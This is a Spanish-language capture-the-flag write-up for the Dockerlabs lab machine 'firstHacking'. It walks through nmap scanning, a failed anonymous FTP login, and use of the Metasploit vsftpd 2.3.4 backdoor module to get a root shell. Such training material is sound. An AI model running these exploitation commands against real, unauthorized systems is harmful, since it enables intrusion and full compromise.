# Write-up

- **Nombre de la m치quina:** `firstHacking` 
- **Plataforma:** `Dockerlabs` 
- **IP:** `172.17.0.2` 
- **SO:** `Linux` 
- **Dificultad:** `Muy F치cil`

-----------------------

## 1. RECONOCIMIENTO

El objetivo de esta fase es identificar los puntos de entrada y servicios expuestos en la m치quina v칤ctima.

#### 1.1. Verificaci칩n de Conectividad

Se lanza un `ping` para confirmar que la m치quina est치 activa y obtener el TTL lo que puede darnos una primera pista sobre el sistema operativo.

```
 ping 172.17.0.2
```
Nos devuelve conectividad y un TTL=64 por lo que estamos ante una m치quina Linux. 

![](Imagenes/138.png)



#### 1.2. Escaneo de Puertos

Se realiza un escaneo con **Nmap** para descubrir puertos abiertos, los servicios que corren en ellos y sus versiones.

```
sudo nmap -p- -sV -sC -sS --min-rate 5000 --open -n -Pn 172.17.0.2 -oN port_scan.txt
```

**Puertos Descubiertos:**

| Puerto | Servicio | Versi칩n          | Notas                                                   |
| ------ | -------- | ---------------- | ------------------------------------------------------- |
| 21     | ftp      | vsftpd 2.3.4<br> | Servidor FTP<br>protocolo de transferencia de archivos. |

![](Imagenes/139.png)

En este escenario, nos encontramos ante una m치quina que solo tiene abierto el puerto 21. Al no haber otros puertos disponibles para explorar, la  v칤a de acceso potencial es realizar un inicio de sesi칩n en el servicio con  usuario anonimo. En caso de que no las encontr치ramos optar칤amos por buscar vulnerabilidades conocidas para la versi칩n `FTP`.

## 2. ENUMERACI칍N

Una vez identificados los servicios, se procede a investigarlos en profundidad en busca de vulnerabilidades o informaci칩n 칰til.

### 21(FTP)


Utilizaremos `Nmap` para la enumeraci칩n FTP. No hay herramientas propias para este cometido. 

Nmap tiene scripts para el servicio `Ftp` que puedes consultar:
```
ls /usr/share/nmap/scripts/ftp*`
```
![](Imagenes/140.png)

Para lanzar un escaneo a la vulnerabilidad `session null` utilizaremos `ftp-anon.nse`

```
sudo nmap -p21 --script ftp-anon 172.17.0.2
```


![](Imagenes/141.png)

No muestra que sea vulnerable a `session null`

Por agotar la v칤a, intentamos una conexi칩n al servicio con usuario `anonymous` y vemos que no es posible. 
```
ftp anonymous 172.17.0.2
```
![](Imagenes/142.png)

En este punto, como hablamos anteriormente optamos por revisar las vulnerabilidades conocidas para la versi칩n del servicio `ftp`: `vsftp 2.3.4`

Para ello abriremos `metasploit`
```
msfconsole -q
```

y buscamos con el comando `search` la versi칩n del servicio `ftp`

```
search vsftp: 2.3.4
```

![](Imagenes/143.png)
Encontramos el exploit `Backdoor Command Execution`


## Explotaci칩n 

### 3.1 Lanzamiento de exploit y acceso inicial.

Para seleccionar el exploit que queremos haremos uso del comando `use` acompa침ado del numero que corresponda al exploit en la columna: `#`

1. `use 0`

![](Imagenes/144.png)
Continuaremos viendo las opciones necesarias para configurar nuetsrao exploit para ello podemos utilizar o `options` o `show options`
2.  `show options`
   
![](Imagenes/145.png)
Se nos desplegar치 una lista  en la que debemos a침adir utilizando el comando `set` la informaci칩n que se marque como `yes` en la columna de Required. 
En nuestro caso se trata de `RHOSTS` que hace referencia a la m치quina objetivo. 

3. `set RHOSTS 172.17.0.2`

![](Imagenes/146.png)
Una vez tengamos lista nuestra configuraci칩n. Lanzaremos el exploit con el comando `run` o `exploit` 

4. `run`

Conseguimos entrar como usuario con m치ximos privilegios `root` con  sesi칩n de  shell poco interactiva. 游

![](Imagenes/147.png)


Comandos de `metasploit`:

1. `use 0`
2. `show options`
3. `set RHOTS 172.17.0.2`
4. `run`
